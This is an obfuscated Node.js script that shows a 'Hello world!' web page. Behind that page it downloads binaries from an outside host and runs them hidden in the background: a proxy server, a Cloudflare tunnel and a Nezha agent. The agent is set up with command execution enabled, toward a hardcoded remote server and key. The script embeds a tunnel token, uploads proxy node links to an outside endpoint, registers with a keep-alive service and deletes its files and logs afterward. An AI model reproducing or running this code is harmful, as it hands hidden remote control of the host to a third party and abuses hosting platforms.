const _0x278c29=_0x31a4;function _0x1765(){const _0x4d2efb=['finish','npm\x20is\x20running','vless','ARGO_PORT','createWriteStream','response','NEZHA_KEY','445842PaHHdd','2bba358a-1158-4036-bbf5-a55caf0f073e','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','bot\x20is\x20running','all','log','tls','fileName','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://oooo.serv00.net/add-url','unshift','UUID','4KprwMH','\x0aclient_secret:\x20','split','php','3290lUtacT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','trim','toString','rUYLjmYX54qvUp8vc06JQTGaJcSwzPh7','arch','none','www.visa.com.sg','vmess','send','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','36552252HZlUmO','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x0a\x20\x20credentials-file:\x20','/api/delete-nodes','chmod','/php\x20-c\x20\x22','false','error','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','./npm','message','https://amd64.ssss.nyc.mn/web','Content-Type','\x0a\x20\x20\x20\x20','\x20is\x20created','\x0avless://','&path=%2Ftrojan-argo%3Fed%3D2560#','PORT','http\x20server\x20is\x20running\x20on\x20port:','Error\x20reading\x20boot.log:','./web','https://arm64.ssss.nyc.mn/agent','./bot','nohup\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','2087','includes','NAME','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','blackhole','match','has','automatic\x20access\x20task\x20added\x20successfully','nezha.520961.xyz:8008','SUB_PATH','/tunnel.yml\x20run','pop','Empowerment\x20success\x20for\x20','http','UPLOAD_URL','aarch64','748084POPhKz','?encryption=none&security=tls&sni=','true','npm','tcp','stream','App\x20is\x20running','?security=tls&sni=','ARGO_DOMAIN:','data','utf-8','443','10FrCQVP','galaxycloud.xxtt.dpdns.org','Error\x20downloading\x20files:','--tls','direct','filter','unlink','/sub.txt\x20saved\x20successfully','express','rm\x20-rf\x20','Error\x20executing\x20command:\x20','CFIP','eyJhIjoiMzQ0YWNlODY2ZGIwMzVjOGQ3YjE2MjFjZWUzOTMxYjYiLCJ0IjoiODk3OWFmNWMtMDUwOC00OWQxLWI3ZTMtNDNjNDVmY2JiMTJmIiwicyI6IlpqVXhaVEUzTkRNdE1USTBNaTAwWlRVMUxXSmpaamt0TXpKaE56ZzJZamRrTmpObCJ9','join','/trojan-argo','catch','8946thUEIW','mkdirSync','2083','base64','axios','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','TunnelSecret','3367837fEBOrN','config.json','text/plain;\x20charset=utf-8','get','push','status','/npm\x20-s\x20','\x20already\x20exists','map','\x20failed:\x20','8443','2053','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NEZHA_SERVER','ARGO_AUTH','https://arm64.ssss.nyc.mn/2go','FILE_PATH','添加URL失败:\x20','existsSync','test','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&path=%2Fvless-argo%3Fed%3D2560#','sub','length','/api/add-subscriptions','https://arm64.ssss.nyc.mn/v1','584hkYFtK','2096','writeFileSync','NEZHA_PORT','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','./php','quic','/bot\x20','web\x20is\x20running','Empowerment\x20failed\x20for\x20','application/json','clear','/vless-argo','pipe','from','Download\x20','web','stringify','child_process','127.0.0.1','\x0a\x20\x20\x0avmess://','path','SERVER_PORT','\x0a\x20\x20tunnel:\x20','tunnel.json','https://amd64.ssss.nyc.mn/2go','3icUjXA','forEach','boot.log','readFileSync','arm64','\x20>/dev/null\x202>&1','Subscription\x20uploaded\x20successfully','\x20>/dev/null\x202>&1\x20&','then','bot','env','close','sub.txt','ArgoDomain:','CFPORT','post','/web\x20-c\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','fileUrl','12588KafGMo','amd','arm','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','exec','4535855tFlYwO','/api/add-nodes'];_0x1765=function(){return _0x4d2efb;};return _0x1765();}(function(_0x5ceece,_0x2c149a){const _0x14c2ea=_0x31a4,_0x48a7dc=_0x5ceece();while(!![]){try{const _0x27654c=-parseInt(_0x14c2ea(0x1f1))/0x1+parseInt(_0x14c2ea(0x1ac))/0x2*(-parseInt(_0x14c2ea(0x18b))/0x3)+-parseInt(_0x14c2ea(0x1b8))/0x4*(parseInt(_0x14c2ea(0x1a3))/0x5)+parseInt(_0x14c2ea(0x19e))/0x6*(-parseInt(_0x14c2ea(0x1bc))/0x7)+-parseInt(_0x14c2ea(0x171))/0x8*(-parseInt(_0x14c2ea(0x150))/0x9)+parseInt(_0x14c2ea(0x1fd))/0xa*(parseInt(_0x14c2ea(0x157))/0xb)+parseInt(_0x14c2ea(0x1c7))/0xc;if(_0x27654c===_0x2c149a)break;else _0x48a7dc['push'](_0x48a7dc['shift']());}catch(_0x4aa113){_0x48a7dc['push'](_0x48a7dc['shift']());}}}(_0x1765,0x88d82));const express=require(_0x278c29(0x148)),app=express(),axios=require(_0x278c29(0x154)),os=require('os'),fs=require('fs'),path=require(_0x278c29(0x186)),{promisify}=require('util'),exec=promisify(require(_0x278c29(0x183))[_0x278c29(0x1a2)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x278c29(0x195)][_0x278c29(0x1ef)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x278c29(0x195)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x278c29(0x195)][_0x278c29(0x167)]||'./tmp',SUB_PATH=process[_0x278c29(0x195)][_0x278c29(0x1ea)]||_0x278c29(0x16d),PORT=process[_0x278c29(0x195)][_0x278c29(0x187)]||process[_0x278c29(0x195)][_0x278c29(0x1d8)]||0xbb8,UUID=process[_0x278c29(0x195)][_0x278c29(0x1b7)]||_0x278c29(0x1ad),NEZHA_SERVER=process[_0x278c29(0x195)][_0x278c29(0x164)]||_0x278c29(0x1e9),NEZHA_PORT=process[_0x278c29(0x195)][_0x278c29(0x174)]||'',NEZHA_KEY=process[_0x278c29(0x195)][_0x278c29(0x1ab)]||_0x278c29(0x1c0),ARGO_DOMAIN=process[_0x278c29(0x195)]['ARGO_DOMAIN']||_0x278c29(0x141),ARGO_AUTH=process[_0x278c29(0x195)][_0x278c29(0x165)]||_0x278c29(0x14c),ARGO_PORT=process[_0x278c29(0x195)][_0x278c29(0x1a8)]||0x1f41,CFIP=process[_0x278c29(0x195)][_0x278c29(0x14b)]||_0x278c29(0x1c3),CFPORT=process[_0x278c29(0x195)][_0x278c29(0x199)]||0x1bb,NAME=process[_0x278c29(0x195)][_0x278c29(0x1e2)]||'Vls';!fs[_0x278c29(0x169)](FILE_PATH)?(fs[_0x278c29(0x151)](FILE_PATH),console[_0x278c29(0x1b1)](FILE_PATH+_0x278c29(0x1d5))):console[_0x278c29(0x1b1)](FILE_PATH+_0x278c29(0x15e));let npmPath=path[_0x278c29(0x14d)](FILE_PATH,_0x278c29(0x1f4)),phpPath=path['join'](FILE_PATH,_0x278c29(0x1bb)),webPath=path['join'](FILE_PATH,_0x278c29(0x181)),botPath=path[_0x278c29(0x14d)](FILE_PATH,_0x278c29(0x194)),subPath=path[_0x278c29(0x14d)](FILE_PATH,_0x278c29(0x197)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x278c29(0x14d)](FILE_PATH,_0x278c29(0x18d)),configPath=path[_0x278c29(0x14d)](FILE_PATH,_0x278c29(0x158));function deleteNodes(){const _0x27c31a=_0x278c29;try{if(!UPLOAD_URL)return;if(!fs[_0x27c31a(0x169)](subPath))return;let _0x1368e3;try{_0x1368e3=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x5b4509=Buffer[_0x27c31a(0x17f)](_0x1368e3,_0x27c31a(0x153))['toString'](_0x27c31a(0x1fb)),_0x3ba7f9=_0x5b4509[_0x27c31a(0x1ba)]('\x0a')[_0x27c31a(0x145)](_0x486604=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x27c31a(0x16a)](_0x486604));if(_0x3ba7f9['length']===0x0)return;return axios[_0x27c31a(0x19a)](UPLOAD_URL+_0x27c31a(0x1ca),JSON[_0x27c31a(0x182)]({'nodes':_0x3ba7f9}),{'headers':{'Content-Type':_0x27c31a(0x17b)}})[_0x27c31a(0x14f)](_0x447b16=>{return null;});}catch(_0x5adfec){return null;}}function cleanupOldFiles(){const _0x3805b6=_0x278c29,_0x120c62=[_0x3805b6(0x181),_0x3805b6(0x194),_0x3805b6(0x1f4),_0x3805b6(0x1bb),_0x3805b6(0x197),_0x3805b6(0x18d)];_0x120c62[_0x3805b6(0x18c)](_0x34450e=>{const _0x483e38=_0x3805b6,_0x31859d=path[_0x483e38(0x14d)](FILE_PATH,_0x34450e);fs[_0x483e38(0x146)](_0x31859d,()=>{});});}app[_0x278c29(0x15a)]('/',function(_0x211ed9,_0x59106e){const _0x492cc3=_0x278c29;_0x59106e[_0x492cc3(0x1c5)]('Hello\x20world!');});function _0x31a4(_0x41ac1b,_0x4e436b){const _0x176545=_0x1765();return _0x31a4=function(_0x31a43d,_0x1be33c){_0x31a43d=_0x31a43d-0x141;let _0x3154ce=_0x176545[_0x31a43d];return _0x3154ce;},_0x31a4(_0x41ac1b,_0x4e436b);}const config={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x278c29(0x1c2)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x278c29(0x1c2),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x278c29(0x1f5)}},{'port':0xbb9,'listen':_0x278c29(0x184),'protocol':_0x278c29(0x1a7),'settings':{'clients':[{'id':UUID}],'decryption':_0x278c29(0x1c2)},'streamSettings':{'network':_0x278c29(0x1f5),'security':'none'}},{'port':0xbba,'listen':_0x278c29(0x184),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x278c29(0x1c2)},'streamSettings':{'network':'ws','security':_0x278c29(0x1c2),'wsSettings':{'path':_0x278c29(0x17d)}},'sniffing':{'enabled':!![],'destOverride':[_0x278c29(0x1ee),_0x278c29(0x1b2),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x278c29(0x184),'protocol':_0x278c29(0x1c4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x278c29(0x177)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x278c29(0x184),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x278c29(0x1c2),'wsSettings':{'path':_0x278c29(0x14e)}},'sniffing':{'enabled':!![],'destOverride':[_0x278c29(0x1ee),_0x278c29(0x1b2),_0x278c29(0x177)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x278c29(0x144)},{'protocol':_0x278c29(0x1e5),'tag':'block'}]};fs[_0x278c29(0x173)](path[_0x278c29(0x14d)](FILE_PATH,_0x278c29(0x158)),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x4c2524=_0x278c29,_0x57fe3f=os[_0x4c2524(0x1c1)]();return _0x57fe3f===_0x4c2524(0x1a0)||_0x57fe3f===_0x4c2524(0x18f)||_0x57fe3f===_0x4c2524(0x1f0)?_0x4c2524(0x1a0):_0x4c2524(0x19f);}function downloadFile(_0x1ae1f1,_0xde1154,_0x55f3c1){const _0x4099ca=_0x278c29,_0x38c143=path[_0x4099ca(0x14d)](FILE_PATH,_0x1ae1f1),_0x2009e4=fs[_0x4099ca(0x1a9)](_0x38c143);axios({'method':'get','url':_0xde1154,'responseType':_0x4099ca(0x1f6)})[_0x4099ca(0x193)](_0x30c3e2=>{const _0x5e0ccd=_0x4099ca;_0x30c3e2[_0x5e0ccd(0x1fa)][_0x5e0ccd(0x17e)](_0x2009e4),_0x2009e4['on'](_0x5e0ccd(0x1a5),()=>{const _0x29d29f=_0x5e0ccd;_0x2009e4[_0x29d29f(0x196)](),console[_0x29d29f(0x1b1)](_0x29d29f(0x180)+_0x1ae1f1+'\x20successfully'),_0x55f3c1(null,_0x1ae1f1);}),_0x2009e4['on']('error',_0x2ba379=>{const _0x1cae0c=_0x5e0ccd;fs[_0x1cae0c(0x146)](_0x38c143,()=>{});const _0x33148d=_0x1cae0c(0x180)+_0x1ae1f1+_0x1cae0c(0x160)+_0x2ba379['message'];console[_0x1cae0c(0x1ce)](_0x33148d),_0x55f3c1(_0x33148d);});})['catch'](_0xe0b964=>{const _0x55c9bc=_0x4099ca,_0x4a7844=_0x55c9bc(0x180)+_0x1ae1f1+_0x55c9bc(0x160)+_0xe0b964[_0x55c9bc(0x1d1)];console['error'](_0x4a7844),_0x55f3c1(_0x4a7844);});}async function downloadFilesAndRun(){const _0xbaa33e=_0x278c29,_0x59f21f=getSystemArchitecture(),_0x13fc2d=getFilesForArchitecture(_0x59f21f);if(_0x13fc2d[_0xbaa33e(0x16e)]===0x0){console[_0xbaa33e(0x1b1)](_0xbaa33e(0x1e4));return;}const _0x3b5ae5=_0x13fc2d[_0xbaa33e(0x15f)](_0x4137b4=>{return new Promise((_0x22fb7a,_0x5e7324)=>{const _0x5afe64=_0x31a4;downloadFile(_0x4137b4[_0x5afe64(0x1b3)],_0x4137b4[_0x5afe64(0x19d)],(_0x3b196d,_0x5c3c22)=>{_0x3b196d?_0x5e7324(_0x3b196d):_0x22fb7a(_0x5c3c22);});});});try{await Promise[_0xbaa33e(0x1b0)](_0x3b5ae5);}catch(_0x3c1219){console[_0xbaa33e(0x1ce)](_0xbaa33e(0x142),_0x3c1219);return;}function _0x21f632(_0x5261bc){const _0x13c767=_0xbaa33e,_0x4a42fd=0x1fd;_0x5261bc[_0x13c767(0x18c)](_0x3d8fb3=>{const _0x4ecc45=_0x13c767,_0xe935e5=path['join'](FILE_PATH,_0x3d8fb3);fs[_0x4ecc45(0x169)](_0xe935e5)&&fs[_0x4ecc45(0x1cb)](_0xe935e5,_0x4a42fd,_0x5456b9=>{const _0x4d6226=_0x4ecc45;_0x5456b9?console[_0x4d6226(0x1ce)](_0x4d6226(0x17a)+_0xe935e5+':\x20'+_0x5456b9):console[_0x4d6226(0x1b1)](_0x4d6226(0x1ed)+_0xe935e5+':\x20'+_0x4a42fd[_0x4d6226(0x1bf)](0x8));});});}const _0x9a869c=NEZHA_PORT?[_0xbaa33e(0x1d0),_0xbaa33e(0x1db),_0xbaa33e(0x1dd)]:[_0xbaa33e(0x176),'./web',_0xbaa33e(0x1dd)];_0x21f632(_0x9a869c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x35b8fd=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0xbaa33e(0x1ec)]():'',_0x501594=new Set(['443',_0xbaa33e(0x161),_0xbaa33e(0x172),_0xbaa33e(0x1e0),_0xbaa33e(0x152),_0xbaa33e(0x162)]),_0xac1ad9=_0x501594[_0xbaa33e(0x1e7)](_0x35b8fd)?_0xbaa33e(0x1f3):_0xbaa33e(0x1cd),_0x327c6f=_0xbaa33e(0x1b9)+NEZHA_KEY+_0xbaa33e(0x1cf)+NEZHA_SERVER+_0xbaa33e(0x1e3)+_0xac1ad9+_0xbaa33e(0x16b)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,'config.yaml'),_0x327c6f);const _0x3be57d=_0xbaa33e(0x1de)+FILE_PATH+_0xbaa33e(0x1cc)+FILE_PATH+_0xbaa33e(0x175);try{await exec(_0x3be57d),console[_0xbaa33e(0x1b1)]('php\x20is\x20running'),await new Promise(_0x5b48cc=>setTimeout(_0x5b48cc,0x3e8));}catch(_0x87faf9){console[_0xbaa33e(0x1ce)]('php\x20running\x20error:\x20'+_0x87faf9);}}else{let _0x3faada='';const _0x5e40b2=[_0xbaa33e(0x1fc),_0xbaa33e(0x161),_0xbaa33e(0x172),'2087','2083',_0xbaa33e(0x162)];_0x5e40b2[_0xbaa33e(0x1e1)](NEZHA_PORT)&&(_0x3faada=_0xbaa33e(0x143));const _0x3cf080=_0xbaa33e(0x1de)+FILE_PATH+_0xbaa33e(0x15d)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3faada+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3cf080),console[_0xbaa33e(0x1b1)](_0xbaa33e(0x1a6)),await new Promise(_0x5a2457=>setTimeout(_0x5a2457,0x3e8));}catch(_0x4ccde7){console['error']('npm\x20running\x20error:\x20'+_0x4ccde7);}}}else console[_0xbaa33e(0x1b1)](_0xbaa33e(0x1b4));const _0x395de4='nohup\x20'+FILE_PATH+_0xbaa33e(0x19b)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x395de4),console[_0xbaa33e(0x1b1)](_0xbaa33e(0x179)),await new Promise(_0x27e96e=>setTimeout(_0x27e96e,0x3e8));}catch(_0x37e210){console[_0xbaa33e(0x1ce)]('web\x20running\x20error:\x20'+_0x37e210);}if(fs[_0xbaa33e(0x169)](path[_0xbaa33e(0x14d)](FILE_PATH,'bot'))){let _0x626ec4;if(ARGO_AUTH[_0xbaa33e(0x1e6)](/^[A-Z0-9a-z=]{120,250}$/))_0x626ec4='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0xbaa33e(0x1e6)](/TunnelSecret/)?_0x626ec4=_0xbaa33e(0x1df)+FILE_PATH+_0xbaa33e(0x1eb):_0x626ec4='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xbaa33e(0x155)+ARGO_PORT;try{await exec(_0xbaa33e(0x1de)+FILE_PATH+_0xbaa33e(0x178)+_0x626ec4+_0xbaa33e(0x192)),console[_0xbaa33e(0x1b1)](_0xbaa33e(0x1af)),await new Promise(_0x14438c=>setTimeout(_0x14438c,0x7d0));}catch(_0x51949c){console[_0xbaa33e(0x1ce)](_0xbaa33e(0x14a)+_0x51949c);}}await new Promise(_0x7f4558=>setTimeout(_0x7f4558,0x1388));}function getFilesForArchitecture(_0x47ca33){const _0x1feb20=_0x278c29;let _0x1c7c0a;_0x47ca33===_0x1feb20(0x1a0)?_0x1c7c0a=[{'fileName':_0x1feb20(0x181),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x1feb20(0x194),'fileUrl':_0x1feb20(0x166)}]:_0x1c7c0a=[{'fileName':_0x1feb20(0x181),'fileUrl':_0x1feb20(0x1d2)},{'fileName':_0x1feb20(0x194),'fileUrl':_0x1feb20(0x18a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x32d0a2=_0x47ca33===_0x1feb20(0x1a0)?_0x1feb20(0x1dc):'https://amd64.ssss.nyc.mn/agent';_0x1c7c0a[_0x1feb20(0x1b6)]({'fileName':_0x1feb20(0x1f4),'fileUrl':_0x32d0a2});}else{const _0x4de024=_0x47ca33===_0x1feb20(0x1a0)?_0x1feb20(0x170):'https://amd64.ssss.nyc.mn/v1';_0x1c7c0a[_0x1feb20(0x1b6)]({'fileName':_0x1feb20(0x1bb),'fileUrl':_0x4de024});}}return _0x1c7c0a;}function argoType(){const _0x27f7bd=_0x278c29;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x27f7bd(0x163));return;}if(ARGO_AUTH[_0x27f7bd(0x1e1)](_0x27f7bd(0x156))){fs['writeFileSync'](path[_0x27f7bd(0x14d)](FILE_PATH,_0x27f7bd(0x189)),ARGO_AUTH);const _0x37bf4d=_0x27f7bd(0x188)+ARGO_AUTH[_0x27f7bd(0x1ba)]('\x22')[0xb]+_0x27f7bd(0x1c9)+path['join'](FILE_PATH,_0x27f7bd(0x189))+_0x27f7bd(0x1c6)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x27f7bd(0x173)](path['join'](FILE_PATH,'tunnel.yml'),_0x37bf4d);}else console[_0x27f7bd(0x1b1)](_0x27f7bd(0x19c));}argoType();async function extractDomains(){const _0x58d76d=_0x278c29;let _0x26509d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x26509d=ARGO_DOMAIN,console[_0x58d76d(0x1b1)](_0x58d76d(0x1f9),_0x26509d),await _0x4f0ab3(_0x26509d);else try{const _0x5af4fe=fs[_0x58d76d(0x18e)](path[_0x58d76d(0x14d)](FILE_PATH,_0x58d76d(0x18d)),'utf-8'),_0x595a2c=_0x5af4fe[_0x58d76d(0x1ba)]('\x0a'),_0x45295b=[];_0x595a2c[_0x58d76d(0x18c)](_0x4c6987=>{const _0x2eae20=_0x58d76d,_0xcf8dbc=_0x4c6987[_0x2eae20(0x1e6)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xcf8dbc){const _0x42b00b=_0xcf8dbc[0x1];_0x45295b[_0x2eae20(0x15b)](_0x42b00b);}});if(_0x45295b[_0x58d76d(0x16e)]>0x0)_0x26509d=_0x45295b[0x0],console[_0x58d76d(0x1b1)](_0x58d76d(0x198),_0x26509d),await _0x4f0ab3(_0x26509d);else{console[_0x58d76d(0x1b1)](_0x58d76d(0x1a1)),fs['unlinkSync'](path[_0x58d76d(0x14d)](FILE_PATH,'boot.log'));async function _0x3a3563(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x55ba91){}}_0x3a3563(),await new Promise(_0x464c8b=>setTimeout(_0x464c8b,0xbb8));const _0x770824=_0x58d76d(0x1ae)+FILE_PATH+_0x58d76d(0x155)+ARGO_PORT;try{await exec(_0x58d76d(0x1de)+path[_0x58d76d(0x14d)](FILE_PATH,_0x58d76d(0x194))+'\x20'+_0x770824+_0x58d76d(0x192)),console['log']('bot\x20is\x20running.'),await new Promise(_0x4fd30f=>setTimeout(_0x4fd30f,0xbb8)),await extractDomains();}catch(_0x58089e){console[_0x58d76d(0x1ce)](_0x58d76d(0x14a)+_0x58089e);}}}catch(_0x55e7d1){console[_0x58d76d(0x1ce)](_0x58d76d(0x1da),_0x55e7d1);}async function _0x4f0ab3(_0x4c722e){const _0x39e9b0=_0x58d76d,_0x28767a=execSync(_0x39e9b0(0x1c8),{'encoding':_0x39e9b0(0x1fb)}),_0x510eb4=_0x28767a[_0x39e9b0(0x1be)]();return new Promise(_0x53ac63=>{setTimeout(()=>{const _0x3f7a5e=_0x31a4,_0x5c67a0={'v':'2','ps':NAME+'-'+_0x510eb4,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3f7a5e(0x1c2),'net':'ws','type':_0x3f7a5e(0x1c2),'host':_0x4c722e,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x4c722e,'alpn':''},_0x21ec2a=_0x3f7a5e(0x1d6)+UUID+'@'+CFIP+':'+CFPORT+_0x3f7a5e(0x1f2)+_0x4c722e+'&type=ws&host='+_0x4c722e+_0x3f7a5e(0x16c)+NAME+'-'+_0x510eb4+_0x3f7a5e(0x185)+Buffer[_0x3f7a5e(0x17f)](JSON[_0x3f7a5e(0x182)](_0x5c67a0))[_0x3f7a5e(0x1bf)](_0x3f7a5e(0x153))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x3f7a5e(0x1f8)+_0x4c722e+'&type=ws&host='+_0x4c722e+_0x3f7a5e(0x1d7)+NAME+'-'+_0x510eb4+_0x3f7a5e(0x1d4);console['log'](Buffer[_0x3f7a5e(0x17f)](_0x21ec2a)[_0x3f7a5e(0x1bf)](_0x3f7a5e(0x153))),fs[_0x3f7a5e(0x173)](subPath,Buffer[_0x3f7a5e(0x17f)](_0x21ec2a)[_0x3f7a5e(0x1bf)]('base64')),console[_0x3f7a5e(0x1b1)](FILE_PATH+_0x3f7a5e(0x147)),uplodNodes(),app[_0x3f7a5e(0x15a)]('/'+SUB_PATH,(_0x1c9eaa,_0x4c77c1)=>{const _0x5c0ebb=_0x3f7a5e,_0xc4e585=Buffer['from'](_0x21ec2a)['toString'](_0x5c0ebb(0x153));_0x4c77c1['set'](_0x5c0ebb(0x1d3),_0x5c0ebb(0x159)),_0x4c77c1[_0x5c0ebb(0x1c5)](_0xc4e585);}),_0x53ac63(_0x21ec2a);},0x7d0);});}}async function uplodNodes(){const _0x2d131c=_0x278c29;if(UPLOAD_URL&&PROJECT_URL){const _0x10f7bd=PROJECT_URL+'/'+SUB_PATH,_0x321e05={'subscription':[_0x10f7bd]};try{const _0x1dff0c=await axios['post'](UPLOAD_URL+_0x2d131c(0x16f),_0x321e05,{'headers':{'Content-Type':_0x2d131c(0x17b)}});if(_0x1dff0c['status']===0xc8)console[_0x2d131c(0x1b1)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0xb8c1a0){if(_0xb8c1a0['response']){if(_0xb8c1a0[_0x2d131c(0x1aa)][_0x2d131c(0x15c)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x909b46=fs['readFileSync'](listPath,'utf-8'),_0x419274=_0x909b46[_0x2d131c(0x1ba)]('\x0a')['filter'](_0x3a0684=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2d131c(0x16a)](_0x3a0684));if(_0x419274['length']===0x0)return;const _0x2c60e1=JSON[_0x2d131c(0x182)]({'nodes':_0x419274});try{await axios[_0x2d131c(0x19a)](UPLOAD_URL+_0x2d131c(0x1a4),_0x2c60e1,{'headers':{'Content-Type':_0x2d131c(0x17b)}});if(response[_0x2d131c(0x15c)]===0xc8)console['log'](_0x2d131c(0x191));else return null;}catch(_0x4b9389){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xe888be=_0x31a4,_0x4a3b6f=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x4a3b6f[_0xe888be(0x15b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4a3b6f[_0xe888be(0x15b)](phpPath);exec(_0xe888be(0x149)+_0x4a3b6f[_0xe888be(0x14d)]('\x20')+_0xe888be(0x190),_0x95922f=>{const _0x25e60c=_0xe888be;console[_0x25e60c(0x17c)](),console['log'](_0x25e60c(0x1f7)),console[_0x25e60c(0x1b1)](_0x25e60c(0x1bd));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2fd098=_0x278c29;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2fd098(0x1b1)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x2e6be4=await axios['post'](_0x2fd098(0x1b5),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2fd098(0x17b)}});console['log'](_0x2fd098(0x1e8));}catch(_0x1dda27){console[_0x2fd098(0x1ce)](_0x2fd098(0x168)+_0x1dda27['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console[_0x278c29(0x1b1)](_0x278c29(0x1d9)+PORT+'!'));
